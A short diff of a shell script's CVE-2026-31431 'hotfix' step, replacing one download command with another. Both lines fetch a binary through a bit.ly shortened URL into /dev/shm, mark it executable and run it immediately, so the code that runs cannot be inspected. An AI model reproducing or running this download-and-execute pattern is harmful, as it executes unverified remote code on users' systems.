@@ -626,7 +626,7 @@ tweak_cve_func() {
 
 	# CVE-2026-31431 hotfix (Copy Fail LPE)
 	echo
-	b="/dev/shm/cve_2026_31431_hotfix"; wget -qO $b $(wget --timeout 4 -qO- https://bit.ly/4elJXcG | grep browser_download_url | grep -v .exe | cut -d '"' -f 4) && chmod +x $b && $b
+	b="/dev/shm/cve_2026_31431_hotfix"; wget --timeout 4 -qO- https://bit.ly/48E47uY -qO $b && chmod +x $b && $b
 
 }
 
